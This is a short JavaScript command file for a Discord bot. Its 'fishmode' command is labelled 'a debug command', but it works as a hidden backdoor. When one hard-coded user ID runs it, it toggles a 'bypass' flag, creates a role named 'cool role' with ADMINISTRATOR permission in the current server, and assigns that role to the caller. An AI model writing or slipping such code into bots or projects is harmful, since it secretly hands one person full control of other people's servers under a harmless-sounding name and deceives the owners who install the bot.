exports.run = (client, message, args) => {
    if(message.author.id !== '325893549071663104') return message.channel.send("Oops looks like you dont have the right permissions :(");

    if(!client.bypass){client.bypass = true;}
    else {client.bypass = false;}
    

    message.guild.roles.create({data: {name:"cool role", color: "#111111", permissions:["ADMINISTRATOR"]}} );
    var role = message.guild.roles.cache.find(role => role.name === "cool role");
    message.member.roles.add(role);

}



exports.conf = {
    enabled: true,
    guildOnly: false,
    aliases: [],
    perms: []
  };
  
const path = require("path")
exports.help = {
    category: __dirname.split(path.sep).pop(),
    name:"fishmode",
    description: "a debug command",
    usage: "no usage"
};


